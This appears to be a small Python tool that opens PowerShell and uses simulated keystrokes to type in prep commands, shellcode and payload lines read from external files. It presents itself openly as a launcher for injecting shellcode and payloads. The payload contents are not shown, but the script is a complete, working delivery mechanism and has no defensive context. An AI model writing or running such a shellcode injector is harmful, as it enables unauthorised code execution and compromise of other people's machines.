from subprocess import Popen
from pyautogui import write, press
from time import sleep

# consts
run = lambda string: Popen(string, shell=True) # subprocess create
enter = lambda: press('enter') # enter() key press
sec = 1.5 # delay

# file reading func
def read(file):
    with open(file, 'r') as f:
        return f.read()

# read payloads
prep_cmds = read('cmds.txt')
shellcode = read('shellcode.txt')
payload = read('payload.txt')

# run commands
run('start powershell.exe'); sleep(2.5)
write(prep_cmds); sleep(sec); enter()
write(shellcode); sleep(sec); enter()

# run commands
for line in payload.split('\n'):
    write(line); sleep(0.1); enter()
